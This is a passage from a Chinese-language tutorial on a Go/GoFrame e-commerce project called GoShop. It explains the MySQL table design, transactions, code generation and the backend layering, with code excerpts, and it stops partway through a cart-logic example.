# 第 0 章 先建立一个整体印象

## 0.1 一个网站就是三家店

把 GoShop 想成一家实体店，它由三个部分组成，缺一不可：

| 部分 | 在这家店里的角色 | 本项目里是什么 |
|---|---|---|
| 数据库 | **仓库**。所有货物、账本都堆在这里 | MySQL 数据库 `gfstudy`，7 张表 |
| 后端 | **后厨 + 库管**。没人能直接进仓库，想拿货必须经过它，它负责查规则、动手、记账 | Go 语言写的程序，跑在 8000 端口 |
| 前端 | **店面 + 服务员**。顾客看到的样子，顾客说的话由它转达给后厨 | 两个 HTML 文件，浏览器里跑的 JavaScript |

顾客（也就是你打开浏览器）永远不会直接接触仓库。你点一下"加入购物车"，店面把这句话翻译成一条**请求**递给后厨，后厨去仓库取数据、按规矩处理、把结果写回仓库，再把答复递回店面。店面拿到答复重新画一遍界面。

这条"店面 → 后厨 → 仓库 → 后厨 → 店面"的路，就是这个项目 90% 的代码在做的事。

## 0.2 一次点击的完整旅程

以「在商品列表点「加入购物车」」为例，从上到下一共经过 9 个站点：

```
① 浏览器  你点了按钮
            ↓  JavaScript 函数 addToCart(5, 1)
② 前端    发出一条 HTTP 请求
            POST /cart/add   {"goodsId":5,"quantity":1}
            ↑ 同时自动带上 Cookie（里面有你的登录凭证）
            ↓
③ 后端     服务器收到请求，先过中间件 middleware.Auth
            从 Session 里取出 userId=2，确认这个账号存在且没被禁用
            把 userId 塞进"请求上下文"，供后面用
            ↓
④ 后端     路由把请求交给 cart 控制器的 Add 方法
            controller/cart/cart_v1_add.go
            ↓
⑤ 后端     控制器把参数整理成 model.CartAddInput，调用 service.Cart().Add
            ↓
⑥ 后端     logic/cart/cart.go 的 Add 方法开始干活：
            查商品是否存在、是否在售、库存够不够、
            购物车里是否已有这件商品（有就累加，没有就新增）
            ↓
⑦ 后端     dao.Cart.Ctx(ctx).Data(...).Insert()  ← 真正执行 SQL
            ↓
⑧ 数据库   MySQL 把一行数据写进 cart 表，返回新行的 id
            ↓
⑨ 后端     一路 return 回到控制器，组装成 JSON：
            {"code":0,"message":"","data":{"id":12,"quantity":1}}
            ↓
⑩ 前端     api() 拿到 data，刷新购物车数量，弹出"已加入购物车"提示
```

记住这张图。后面每一章都是在放大其中某一个格子。

## 0.3 技术选型：为什么是这些东西

| 东西 | 是什么 | 为什么选它 |
|---|---|---|
| Go 语言 | 编译型语言，写一次编译成一个 exe | 部署简单，一个文件拷走就能跑；并发性能好 |
| GoFrame v2 | Go 的一个 Web 框架 | 自带路由、参数校验、数据库操作、代码生成器，省掉大量重复劳动 |
| MySQL 8 | 关系型数据库 | 最主流，事务、唯一约束这些"保命"机制完备 |
| 原生 HTML + JS | 不用 React/Vue | 就两个页面，引框架反而更复杂；改一行就能看到效果 |
| Session + Cookie | 登录态方案 | 服务端存 userId，浏览器只拿一个随机串，比把身份写在 Cookie 里安全 |

# 第 1 章 数据库：数据存在哪、为什么这么放

## 1.1 表 = 带规矩的 Excel

数据库里存数据的地方叫**表（table）**。形式上它就是一张 Excel：

**user 表真实的样子：**

| id | username | password | nickname | email | phone | status | role |
|---|---|---|---|---|---|---|---|
| 1 | admin | `$2a$10$N9qo8uLO...` | 管理员 | admin@example.com | 13800000000 | 1 | 1 |
| 2 | alice | `$2a$10$7Rk2pQ...` | 爱丽丝 | alice@example.com | 13800001111 | 1 | 0 |
| 3 | bob | `$2a$10$kL9mX...` | bob | NULL | NULL | 0 | 0 |

但表比 Excel 多了三层保护，这三层正是它的价值所在：

1. **字段类型**：`price` 列声明成 `decimal(10,2)`，你就没法往里塞"abc"。
2. **约束**：`username` 声明了 `UNIQUE`，插第二个 admin 会被数据库直接拒绝——不是程序拦的，是数据库拦的。
3. **事务**：一串操作要么全成功，要么全失败，中途断电也不会留下半截数据。

## 1.2 七张表的分工

| 表名 | 存什么 | 一句话理解 |
|---|---|---|
| `user` | 账号 | 谁在用这个网站 |
| `category` | 分类 | 商品的目录，两级（如「数码 → 充电器」） |
| `goods` | 商品 | 有哪些东西可卖、多少钱、还剩多少 |
| `cart` | 购物车 | 某用户想买但还没下单的东西 |
| `orders` | 订单 | 一笔交易的总单（含金额、状态、收货地址） |
| `order_item` | 订单明细 | 这笔订单里具体买了哪几件、当时多少钱 |
| `goods_review` | 评价 | 买完之后打的分数和留言 |

注意 `orders` 为什么是复数：`order` 是 MySQL 的保留字（`ORDER BY` 用的就是它），直接拿它当表名会报错，所以加了个 s。

## 1.3 逐表讲设计

### 1.3.1 user：密码为什么不能存原文

```sql
-- manifest/sql/schema.sql
CREATE TABLE `user` (
  `id`         bigint unsigned NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username`   varchar(50)     NOT NULL                COMMENT '用户名，登录用',
  `password`   varchar(255)    NOT NULL                COMMENT '密码哈希(bcrypt)，禁止存明文',
  `nickname`   varchar(50)     NOT NULL DEFAULT ''     COMMENT '昵称',
  `email`      varchar(100)             DEFAULT NULL   COMMENT '邮箱，可为空但不可重复',
  `phone`      varchar(20)              DEFAULT NULL   COMMENT '手机号，可为空但不可重复',
  `status`     tinyint unsigned NOT NULL DEFAULT 1     COMMENT '状态：1正常 0禁用',
  `role`       tinyint unsigned NOT NULL DEFAULT 0     COMMENT '角色：0普通用户 1管理员',
  `created_at` datetime        NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_username` (`username`),
  UNIQUE KEY `uk_email` (`email`),
  UNIQUE KEY `uk_phone` (`phone`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='用户';
```

逐项看几个关键决定：

**`password` 存的是哈希，不是密码本身。**
上表里 `$2a$10$N9qo8uLO...` 这种字符串，是 bcrypt 算法把 `123456` 加工后的产物。它有两个性质：

- **不可逆**：拿到这串东西算不回 `123456`。
- **同一密码每次加盐结果不同**：所以你在自己电脑上试 `123456` 生成的哈希和表里长得不一样，这是正常的。

验证密码时不是"解密比对"，而是把这个哈希和用户输入的密码一起丢给 bcrypt，让它判断"这两个是不是一对"。对应代码：

```go
// internal/logic/user/user.go 第 75 行
if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password)); err != nil {
    return nil, gerror.NewCode(gcode.CodeNotAuthorized, "用户名或密码错误")
}
```

**`email` / `phone` 是 `DEFAULT NULL` 而不是 `DEFAULT ''`。**
这是一个踩过坑的决定。假设写成 `NOT NULL DEFAULT ''`，并且带 `UNIQUE`：

- 用户 alice 不填邮箱 → 存成 `''`
- 用户 bob 也不填邮箱 → 也想存 `''`
- 数据库说：`''` 已经存在了，这是重复值，拒绝插入 → bob 注册失败

因为 `UNIQUE` 约束下**空字符串算一个具体的值**，只能存在一个。而 `NULL` 在 SQL 里的含义是"没有值"，`UNIQUE` 索引允许多个 `NULL` 并存。

所以代码里必须有这个转换：

```go
// internal/logic/user/user.go 第 385 行
// nullableContact 邮箱/手机号留空时返回 nil，落库即 NULL。
func nullableContact(v string) any {
	if v == "" {
		return nil
	}
	return v
}
```

**`status` 和 `role` 用 `tinyint`。**
`status`：1 正常 / 0 禁用。`role`：0 普通 / 1 管理员。为什么不用布尔值？因为这两列将来可能要扩展（比如 status 加"3 已注销"、role 加"2 客服"），枚举比布尔好扩展。

> 一个反直觉的细节：禁用不是 `status = -1`，而是 0；正常是 1。**默认值 1** 意味着新建用户默认可用。

**`updated_at` 的 `ON UPDATE CURRENT_TIMESTAMP`** 意思是"这行数据每次被修改，这个时间自动刷新"。你不需要在任何代码里写它，数据库自己管。

### 1.3.2 category：自己指向自己，形成两级目录

```sql
CREATE TABLE `category` (
  `id`         int unsigned    NOT NULL AUTO_INCREMENT COMMENT '分类ID',
  `parent_id`  int unsigned    NOT NULL DEFAULT 0      COMMENT '父分类ID，0表示顶级',
  `name`       varchar(50)     NOT NULL                COMMENT '分类名称',
  `sort`       int             NOT NULL DEFAULT 0      COMMENT '排序值，越小越靠前',
  `status`     tinyint unsigned NOT NULL DEFAULT 1     COMMENT '状态：1启用 0停用',
  ...
  KEY `idx_parent` (`parent_id`)
)
```

**`parent_id` 是这张表的关键**：它指向同一张表的另一行。

| id | parent_id | name |
|---|---|---|
| 1 | 0 | 数码 |
| 2 | 1 | 充电器 |
| 3 | 1 | 耳机 |
| 4 | 0 | 生活 |

读法：`parent_id = 0` 的是顶级分类（数码、生活），`parent_id = 1` 的是"数码"的子分类（充电器、耳机）。这样就表达了树形结构，而不需要为"子分类"再建一张表。

项目限定最多两级，这个限制不是数据库强制的，是业务代码强制的（见第 3.2 节）。

`sort` 是排序值，越小越靠前。为什么不用 id 排序？因为运营可能想把"生活"挪到"数码"前面，直接改 sort 就行，不用动 id。

`KEY idx_parent (parent_id)` 是**索引**，下面马上讲。

### 1.3.3 goods：价格为什么必须用 decimal

```sql
CREATE TABLE `goods` (
  ...
  `price`       decimal(10,2)   NOT NULL DEFAULT 0.00   COMMENT '售价，必须用DECIMAL',
  `stock`       int unsigned    NOT NULL DEFAULT 0      COMMENT '库存',
  `cover`       varchar(255)    NOT NULL DEFAULT ''     COMMENT '封面图URL',
  `images`      text                                    COMMENT '多图URL，JSON数组',
  `detail`      text                                    COMMENT '商品详情',
  `sales`       int unsigned    NOT NULL DEFAULT 0      COMMENT '销量',
  `status`      tinyint unsigned NOT NULL DEFAULT 1     COMMENT '状态：1上架 0下架',
  ...
)
```

**`decimal(10,2)` = 总共 10 位数字，小数点后固定 2 位。**
如果用 `float`（浮点数），会出现这种经典问题：

```
0.1 + 0.2 = 0.30000000000000004
```

因为计算机用二进制表示小数，0.1 存不精确。金额上这种误差累积起来会变成对不上账。`decimal` 是专门为此设计的类型，它按十进制精确存储。

但**即使数据库用 decimal，Go 里也是 float64**。因为 GoFrame 的代码生成器把 decimal 映射成了 float64：

```go
// internal/model/entity/goods.go（生成代码）
type Goods struct {
	...
	Price float64 `json:"price" orm:"price" description:"售价，必须用DECIMAL"`
	...
}
```

所以项目里定了一条规矩：**金额在 Go 里一出现就转成"分"（整数）来算，最后再转回元。** 这个工具只有 15 行：

```go
// utility/money/money.go
package money

import "math"

// ToCents 把元换算成分
func ToCents(yuan float64) int64 {
	return int64(math.Round(yuan * 100))
}

// FromCents 把分换算回元
func FromCents(cents int64) float64 {
	return float64(cents) / 100
}
```

用整数分计算的好处：`1999 + 2999 = 4998`，绝对不会有误差。

**`images` 存的是 JSON 字符串。**
一张商品可能有多张图，但数据库是表格结构，"一个格子塞多个值"本身不规范。常见做法有两种：建一张 `goods_image` 子表，或者把数组序列化成字符串塞进 text 字段。项目选了后者，简单够用：

```json
["/img/g1-1.jpg", "/img/g1-2.jpg"]
```

读出时再解析成数组：

```go
// internal/controller/goods/goods_v1_detail.go 第 17 行
images := make([]string, 0)
if item.Images != "" {
    _ = json.Unmarshal([]byte(item.Images), &images)
}
```

### 1.3.4 cart：靠唯一键保证"同一商品只有一条"

```sql
CREATE TABLE `cart` (
  `id`         bigint unsigned NOT NULL AUTO_INCREMENT COMMENT '购物车项ID',
  `user_id`    bigint unsigned NOT NULL                COMMENT '用户ID',
  `goods_id`   bigint unsigned NOT NULL                COMMENT '商品ID',
  `quantity`   int unsigned    NOT NULL DEFAULT 1      COMMENT '数量',
  ...
  UNIQUE KEY `uk_user_goods` (`user_id`, `goods_id`)
)
```

`uk_user_goods (user_id, goods_id)` 是**联合唯一键**：这两列组合起来不能重复。

含义：同一个用户，同一件商品，在购物车里只能有一行。想买 3 个不是插三行，而是把 `quantity` 改成 3。

这个约束带来一个隐形好处：即使前端疯狂点按钮、两个请求同时到达，数据库也只会留下一条（第二个请求会撞唯一键报错，代码里捕获后改成"累加"，见第 3.4 节）。

### 1.3.5 orders 与 order_item：为什么明细要存一份快照

这是整个设计里最值得理解的一点。

```sql
CREATE TABLE `order_item` (
  `id`          bigint unsigned NOT NULL AUTO_INCREMENT COMMENT '明细ID',
  `order_id`    bigint unsigned NOT NULL                COMMENT '订单ID',
  `goods_id`    bigint unsigned NOT NULL                COMMENT '商品ID',
  `goods_name`  varchar(200)    NOT NULL                COMMENT '下单时商品名快照',
  `goods_cover` varchar(255)    NOT NULL DEFAULT ''     COMMENT '下单时封面图快照',
  `goods_price` decimal(10,2)   NOT NULL                COMMENT '下单时单价快照',
  `quantity`    int unsigned    NOT NULL                COMMENT '购买数量',
  `subtotal`    decimal(10,2)   NOT NULL                COMMENT '小计 = 单价 × 数量',
  ...
)
```

问题：既然有 `goods_id` 能查到商品，为什么还要把 `goods_name`、`goods_price` 再抄一份？

因为**商品会变，订单不能变**。

设想的场景：

1. 3 月 1 日，你花 99 元买了「氮化镓充电器」。
2. 3 月 5 日，商家把价格改成 129 元，名字改成「氮化镓充电器 Pro」。
3. 3 月 10 日，你打开「我的订单」想看一眼当时买的东西。

如果订单明细只存 `goods_id`，页面会从 `goods` 表现取名字和价格——你会看到「129 元的 Pro」，而你是 99 元买的。你会以为商家改了你订单的价格。这不只是显示问题，是**账目证据被篡改**。

所以下单一瞬间，把当时的名字、封面、单价"拍个照"存进订单明细。之后商品随便改，订单永远是当初那个样子。这类字段在数据库设计里叫**快照（snapshot）字段**，是电商系统的标准做法。

代码里对应这几行：

```go
// internal/logic/order/order.go 第 88 行
// 商品名、价格、封面存快照，商品后续改价改名不影响历史订单
itemRows = append(itemRows, g.Map{
	itemCols.GoodsId:    item.GoodsID,
	itemCols.GoodsName:  item.Name,
	itemCols.GoodsCover: item.Cover,
	itemCols.GoodsPrice: money.FromCents(money.ToCents(item.Price)),
	itemCols.Quantity:   item.Quantity,
	itemCols.Subtotal:   money.FromCents(cents),
	itemCols.CreatedAt:  gtime.Now(),
})
```

> 顺带解释第 4 行那个看起来绕的写法 `money.FromCents(money.ToCents(item.Price))`：元 → 分 → 元。它的实际效果是**把价格四舍五入到 2 位小数**（比如 19.999 变成 20.00），因为数据库列只保留 2 位，不转的话存进去会被数据库自己截断，可能出现"单价 × 数量 ≠ 小计"的账目错误。这句话值得加一行注释，目前没有。

那订单主表 `orders` 存什么？

```sql
`order_no`         varchar(32)     NOT NULL   COMMENT '订单号，对外展示',
`user_id`          bigint unsigned NOT NULL   COMMENT '下单用户ID',
`total_amount`     decimal(10,2)   NOT NULL   COMMENT '订单总金额',
`status`           tinyint unsigned NOT NULL  COMMENT '状态：0待付款 1已付款 2已发货 3已完成 4已取消',
`receiver_name`    varchar(50)     NOT NULL   COMMENT '收货人',
`receiver_phone`   varchar(20)     NOT NULL   COMMENT '收货电话',
`receiver_address` varchar(255)    NOT NULL   COMMENT '收货地址',
`remark`           varchar(255)    NOT NULL   COMMENT '订单备注',
`paid_at`          datetime                 DEFAULT NULL   COMMENT '付款时间',
```

`order_no` 是给用户看的单号（`20261029143025123456` = 年月日时分秒 + 6 位随机数），和 `id` 的区别是：`id` 是数据库内部编号，连续可猜；`order_no` 是业务编号，不连续、不可猜，适合印在发票上、说给客服听。

`status` 的五个值构成了一个**状态机**：

```
0 待付款 ──付款──> 1 已付款 ──发货──> 2 已发货 ──确认──> 3 已完成
   │
   └──取消──> 4 已取消
```

箭头是单向的，不能从"已完成"退回"待付款"。这个规则在代码里靠 `WHERE status = 原状态` 实现，第 3.5 节详细讲。

`paid_at` 是 `DEFAULT NULL`——没付款就是没有值，不是 1970 年也不是空字符串。

### 1.3.6 goods_review：三列保证"买过才能评、只能评一次"

```sql
CREATE TABLE `goods_review` (
  `id`            bigint unsigned  NOT NULL AUTO_INCREMENT COMMENT '评价ID',
  `goods_id`      bigint unsigned  NOT NULL                COMMENT '商品ID',
  `order_id`      bigint unsigned  NOT NULL                COMMENT '订单ID',
  `order_item_id` bigint unsigned  NOT NULL                COMMENT '订单明细ID，一条明细只能评一次',
  `user_id`       bigint unsigned  NOT NULL                COMMENT '评价用户ID',
  `rating`        tinyint unsigned NOT NULL DEFAULT 5      COMMENT '评分 1-5 星',
  `content`       varchar(500)     NOT NULL DEFAULT ''     COMMENT '评价内容',
  `anonymous`     tinyint unsigned NOT NULL DEFAULT 0      COMMENT '是否匿名：1 是 0 否',
  `status`        tinyint unsigned NOT NULL DEFAULT 1      COMMENT '状态：1 显示 0 隐藏',
  `created_at`    datetime         NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_order_item` (`order_item_id`),
  KEY `idx_goods` (`goods_id`, `status`),
  KEY `idx_user` (`user_id`)
)
```

三个关键点：

**`order_item_id` 是唯一键**，这是"一条订单明细只能评一次"的物理保证。应用层也会先查一遍再插入，但那是"礼貌"；真正兜底的是数据库——两个请求同时进来都通过了检查，第二个会在插入时被唯一键挡下。

**为什么要存 `order_id`？** 虽然能从 `order_item` 反查到，但订单详情页需要"这笔订单里哪些商品已评价"，直接按 `order_id` 一次查完更快。

**`idx_goods (goods_id, status)` 是联合索引**，因为商品详情页的查询永远是"这个商品 + 只显示中的"，两列一起建索引，数据库能一次定位。

## 1.4 索引：给书加目录

数据库表像一本书。要查"username = alice 的那一行"，没有索引就得从第一页翻到最后一页（叫**全表扫描**）。一万人还好，一百万用户就慢了。

索引就是书的目录：按 username 排好序，查到 alice 直接翻到那一页。

```sql
UNIQUE KEY `uk_username` (`username`)   -- 唯一索引：既加速查找，又禁止重复
KEY `idx_user` (`user_id`)              -- 普通索引：只加速查找
KEY `idx_parent` (`parent_id`)          -- 普通索引
KEY `idx_goods` (`goods_id`, `status`)  -- 联合索引
```

三个常识：

1. **不是越多越好**。每次插入/修改数据，所有索引都要跟着更新，索引太多写入就慢。
2. **唯一键是索引 + 约束二合一**。`uk_username` 既让查用户名变快，又保证不会有重名。
3. **联合索引有顺序**。`(goods_id, status)` 能加速"按 goods_id 查"和"按 goods_id + status 查"，但**不能**单独加速"按 status 查"——就像按"省份+城市"排的电话簿，你能快速找到"广东省深圳市"，但没法快速找"所有深圳市"。

项目里每个外键字段（`user_id`、`order_id`、`category_id`）都建了索引，这是基本素养。

## 1.5 事务：要么全做，要么全不做

**事务（transaction）** 是把多个数据库操作打包成一个整体：中间任何一步失败，前面做过的全部撤销，就像从没发生过。

最典型的例子是银行转账：

```
A 账户 -100
B 账户 +100
```

如果第一步成功、第二步失败，钱就凭空消失了。所以两步必须在一个事务里。

本项目的下单流程有四步，必须打包：

1. 扣商品库存
2. 写订单主表
3. 写订单明细
4. 删除购物车里对应的项

如果第 4 步失败（比如数据库连接断了），而前三步已经提交——用户会看到"下单成功，但购物车还在"，再点一次就重复下单了。

代码长这样：

```go
// internal/logic/order/order.go 第 39 行
err := g.DB().Transaction(ctx, func(ctx context.Context, tx gdb.TX) error {
    // ... 里面所有操作都用这个 ctx
    return nil   // 返回 nil = 提交
    // return err  // 返回错误 = 全部回滚
})
```

要点：**事务里的所有数据库操作必须使用传进来的 `ctx`**。GoFrame 的做法是 `dao.Xxx.Ctx(ctx)`——这个 ctx 里带着事务信息，用了它才算在事务内，不用就是另一个独立连接。

## 1.6 表结构怎么变成 Go 代码

数据库里的表，Go 语言不认识。需要一个"翻译"过程：

```sql
goods 表
  id        bigint
  name      varchar
  price     decimal
  created_at datetime
```

↓ 执行 `gf gen dao` 自动生成 ↓

```go
// internal/model/entity/goods.go（部分）
type Goods struct {
	Id        uint64      `json:"id"        orm:"id"`
	Name      string      `json:"name"      orm:"name"`
	Price     float64     `json:"price"     orm:"price"`
	CreatedAt *gtime.Time `json:"createdAt" orm:"created_at"`
}
```

对应关系：

| SQL 类型 | Go 类型 |
|---|---|
| `bigint unsigned` | `uint64` |
| `int unsigned` | `uint` |
| `tinyint unsigned` | `uint` |
| `varchar` / `text` | `string` |
| `decimal` | `float64` |
| `datetime` | `*gtime.Time`（指针，因为可能为 NULL） |

`orm:"..."` 标签告诉框架"这个字段对应哪一列"。`json:"..."` 标签决定它被转成 JSON 给前端时叫什么名字。

**改动表结构后必须重新生成**，否则代码里的字段和数据库对不上。命令：

```bash
gf gen dao
```

## 1.7 建库的两种脚本

`manifest/sql/` 下有两类脚本：

| 目录 | 用途 |
|---|---|
| `schema.sql` | 从零建库的完整图纸，包含全部 7 张表。**会先 DROP TABLE**，只适合空库 |
| `upgrade/*.sql` | 增量升级脚本。比如后来给 user 表加 role 字段 |

已经有数据的环境，绝对不能跑 `schema.sql`（会清空）。只能用 upgrade 脚本：

```bash
# 完整建库（开发机首次搭建）
mysql -h 127.0.0.1 -u root -p gfstudy < manifest/sql/schema.sql

# 增量升级（比如加 role 列）
mysql -h 127.0.0.1 -u root -p gfstudy < manifest/sql/upgrade/20261028_user_role.sql
```

Windows 上如果 `-p` 后面直接跟密码会报 Access denied（环境变量会干扰），改用：

```bash
MYSQL_PWD=123456 mysql --protocol=TCP -h 127.0.0.1 -uroot gfstudy -e "select * from user;"
```

`--protocol=TCP` 是必须的：不加的话客户端可能走命名管道/共享内存，连不上。

# 第 2 章 后端：为什么要分成六层

## 2.1 不分层会怎样

假设所有代码都写在一个文件里，处理"加入购物车"的函数会是这样：

```go
func AddToCart(c *gin.Context) {
    // 1. 从 Cookie 解析登录态
    // 2. 校验 goodsId 是不是数字
    // 3. 查商品存不存在
    // 4. 查库存
    // 5. 查购物车有没有这条
    // 6. 算数量
    // 7. 拼 SQL 插入
    // 8. 组 JSON 返回
}
```

看起来能跑，但三个月后：

- 你想让后台也能"代客加购"，得把 3~7 步再抄一遍
- 产品说"库存判断规则要改"，你得在 5 个函数里各改一次，漏一个就出 bug
- 你想给这段逻辑写测试，得先伪造一个 HTTP 请求

**分层就是为了解决这三个问题**：把"接收请求"和"业务规则"和"读写数据库"拆开，每层只干一件事。

## 2.2 一条请求穿过六层

```
浏览器 POST /cart/add
   ↓
internal/cmd/cmd.go           路由：这个路径交给谁？途中要过哪些中间件？
   ↓
internal/middleware/         中间件：查证件（有没有登录、是不是管理员）
   ↓
api/cart/v1/cart.go          接口定义：这个请求收什么字段、什么类型、有什么校验规则
   ↓
internal/controller/cart/    控制器：把请求参数搬成内部结构，调业务层，把结果搬回响应
   ↓
internal/service/cart.go     接口声明：业务层"应该提供哪些能力"（只有方法签名）
   ↑ 实现
internal/logic/cart/cart.go  业务逻辑：真正的规则都在这里
   ↓
internal/dao/cart.go         数据访问：把"查购物车"翻译成 SQL
   ↓
MySQL
```

第 5 层和第 6 层之间那个"↑ 实现"是关键，第 2.3.3 节专门讲。

## 2.3 每层到底干什么

### 2.3.1 api 层：接口的"合同"

这个文件不执行任何逻辑，它只声明"这个接口长什么样"。但它信息量很大：

```go
// api/cart/v1/cart.go
type AddReq struct {
	g.Meta   `path:"/cart/add" method:"post" summary:"加入购物车" tags:"购物车"`
	GoodsID  uint64 `json:"goodsId"  v:"required|min:1#请选择商品|商品ID不合法"        dc:"商品ID"`
	Quantity uint   `json:"quantity" d:"1" v:"between:1,999#数量需在1-999之间" dc:"购买数量，默认1"`
}
```

逐段翻译：

**`g.Meta` 那一行是路由声明**

| 写法 | 含义 |
|---|---|
| `path:"/cart/add"` | 请求路径是 `/cart/add` |
| `method:"post"` | 只接受 POST 请求（用 GET 访问会 404） |
| `summary:"加入购物车"` | 接口文档里显示的一句话说明 |
| `tags:"购物车"` | 接口文档里的分组 |

GoFrame 会扫描所有 `Req` 结构体上的 `g.Meta`，**自动注册路由**。所以你在这个项目里找不到"路由表"——路由是从这些标签里读出来的。这是 GoFrame 比较特别的设计。

**结构体字段是参数清单**

```go
GoodsID  uint64 `json:"goodsId" ...`
```

含义：请求里必须有个叫 `goodsId` 的字段，Go 里用 `GoodsID` 这个名字接收，类型是无符号 64 位整数（不会出现负数）。

**`v:"..."` 是校验规则**

```
v:"required|min:1#请选择商品|商品ID不合法"
   └─规则──┘ └规则┘└──提示1──┘└───提示2───┘
```

规则之间用 `|` 分隔，`#` 后面是对应的错误提示。所以这条的意思是：

- `required`：必填，没传就是"请选择商品"
- `min:1`：不能小于 1（防止 `goodsId=0` 或负数），违反就是"商品ID不合法"

**校验发生在进入你的代码之前**。也就是说，控制器里的 `req.GoodsID` 一定是有效值，业务代码不用再判断"是不是 0"。这省掉了大量重复判断。

再看一条更复杂的：

```go
Quantity uint `json:"quantity" d:"1" v:"between:1,999#数量需在1-999之间"`
```

- `d:"1"`：**默认值**。前端不传这个字段时，自动填 1。
- `between:1,999`：范围校验。

**`dc:"..."` 是文档注释**，会出现在 `/swagger` 页面上。它不影响运行，纯粹给人看。

常用的校验规则还有：

| 规则 | 作用 | 例子 |
|---|---|---|
| `required` | 必填 | `v:"required#请输入用户名"` |
| `length:3,20` | 长度范围 | 用户名 3-20 字符 |
| `between:1,100` | 数值范围 | 分页大小 1-100 |
| `email` | 邮箱格式 | |
| `phone-loose` | 手机号格式（宽松） | 1 开头 11 位 |
| `in:-1,0,1` | 只能是这几个值之一 | 状态筛选 |
| `max-length:500` | 最大长度 | 评价内容 |

> 为什么手机号用 `phone-loose` 而不是内置的 `phone`？因为内置的 `phone` 用的是老号段白名单，166、191、198 这些新号段会被判为非法。`phone-loose` 只做宽松检查（1[3-9] 开头 11 位），不会误伤。

**`Res` 是响应的形状**

```go
type AddRes struct {
	ID       uint64 `json:"id"       dc:"购物车项ID"`
	Quantity uint   `json:"quantity" dc:"加入后该商品在购物车中的总数量"`
}
```

前端最终拿到的是：

```json
{"code":0,"message":"","data":{"id":12,"quantity":1}}
```

`code` / `message` / `data` 这层外壳是框架自动加的（`MiddlewareHandlerResponse` 中间件的功劳），你只需要定义 `data` 里面的东西。

### 2.3.2 controller 层：只做搬运，不做判断

```go
// internal/controller/cart/cart_v1_add.go
func (c *ControllerV1) Add(ctx context.Context, req *v1.AddReq) (res *v1.AddRes, err error) {
	id, quantity, err := service.Cart().Add(ctx, model.CartAddInput{
		UserID:   currentUserID(ctx),
		GoodsID:  req.GoodsID,
		Quantity: req.Quantity,
	})
	if err != nil {
		return nil, err
	}
	return &v1.AddRes{ID: id, Quantity: quantity}, nil
}
```

这个函数做了四件事，没有第五件：

1. 从请求上下文取出当前用户 ID
2. 把 `api` 层的参数，转成 `model` 层的参数（两个结构体字段几乎一样，但这层转换是必要的，见下）
3. 调业务层
4. 把业务层的返回值转成 `api` 层的响应

**为什么不能直接用 `req` 当业务参数？**
因为 `api` 层的结构体是"对外的合同"，改它等于改 API（可能影响前端和第三方）；`model` 层的结构体是"内部的约定"，可以随时改。两者分开，改内部结构不会破坏外部接口。

**控制器里不写 if 判断业务规则**。看到 `if err != nil { return nil, err }` 这种是正常的错误透传，不算业务判断。

### 2.3.3 service 层：这层看起来"什么都没干"，但很重要

`internal/service/cart.go` 是一个**只有方法签名、没有实现**的文件（由 `gf gen service` 生成）：

```go
// internal/service/cart.go（生成代码，节选）
type (
	ICart interface {
		Add(ctx context.Context, in model.CartAddInput) (uint64, uint, error)
		List(ctx context.Context, userID uint64) (*model.CartListOutput, error)
		UpdateQuantity(ctx context.Context, userID, cartID uint64, quantity uint) error
		Remove(ctx context.Context, userID, cartID uint64) error
		Clear(ctx context.Context, userID uint64) (int, error)
	}
)

var (
	localCart ICart
)

func Cart() ICart {
	if localCart == nil {
		panic("implement not found for interface ICart, forgot register?")
	}
	return localCart
}

func RegisterCart(i ICart) {
	localCart = i
}
```

然后是具体的实现：

```go
// internal/logic/cart/cart.go 开头
type sCart struct{}

func init() {
	service.RegisterCart(&sCart{})
}
```

**这段代码在干什么？**

`init()` 是 Go 的特殊函数，包被加载时自动执行。它把 `sCart{}` 这个实现"插"到 `service` 包的 `localCart` 变量里。

之后任何地方调用 `service.Cart().Add(...)`，实际执行的是 `sCart.Add(...)`。

这叫什么？叫**依赖倒置**。好处是：

- 调用方（控制器）只依赖 `service.ICart` 这个"插座"，不依赖具体实现
- 想换实现（比如加个 Redis 缓存版购物车），只要写个新结构体实现同样 5 个方法，改一行注册代码就行
- 想写测试，注册一个假实现进去，不用连数据库

还有个小作用：`service.Cart()` 里那句 `panic("implement not found")` 是个保险。如果哪天忘了写 `init()` 注册，程序一启动就崩，而不是运行到一半莫名其妙出错。

**`main.go` 里的空白导入就是为了触发这些 `init()`：**

```go
// main.go
import (
	_ "github.com/gogf/gf/contrib/drivers/mysql/v2"  // 触发 MySQL 驱动注册
	_ "goshop/internal/logic"                        // 触发出所有业务模块的 init()
)
```

`_` 的意思是"我不用这个包里的东西，只是为了执行它的 init()"。而 `internal/logic/logic.go` 又是把所有子包再空白导入一遍：

```go
// internal/logic/logic.go（生成代码）
import (
	_ "goshop/internal/logic/cart"
	_ "goshop/internal/logic/category"
	_ "goshop/internal/logic/goods"
	_ "goshop/internal/logic/order"
	_ "goshop/internal/logic/review"
	_ "goshop/internal/logic/user"
)
```

所以加载顺序是：`main` → `internal/logic` → 各业务包 → 各自的 `init()` 执行 → `service.XXX()` 可以正常调用了。

### 2.3.4 logic 层：唯一该写业务规则的地方

这是项目里代码最多的一层，也是最值得读的一层。以购物车的 `Add` 为例，完整读一遍（`internal/logic/cart/cart.go`）：

```go
func (s *sCart) Add(ctx context.Context, in model.CartAddInput) (uint64, uint, error) {
	// 第 1 步：商品必须存在且在售
	goods, err := service.Goods().GetById(ctx, in.GoodsID)
	if err != nil {
		return 0, 0, err
	}
```

注意这里**调的是 `service.Goods().GetById`，不是直接查 dao**。因为 `Goods().GetById` 里已经带了 `status = 1`（只查上架商品）的条件。业务层之间互相调用，复用规则，不重复实现。

```go
	if goods.Stock == 0 {
		return 0, 0, gerror.NewCode(gcode.CodeNotFound, "商品已售罄")
	}
```

库存为 0 直接拒绝。这是第一条业务规则。

```go
	cols := dao.Cart.Columns()
	exist, err := s.getByGoods(ctx, in.UserID, in.GoodsID)
	if err != nil {
		return 0, 0, err
	}

	quantity := in.Quantity
	if exist != nil {
		quantity += exist.Quantity   // 已存在就累加
	}
	if quantity > goods.Stock {
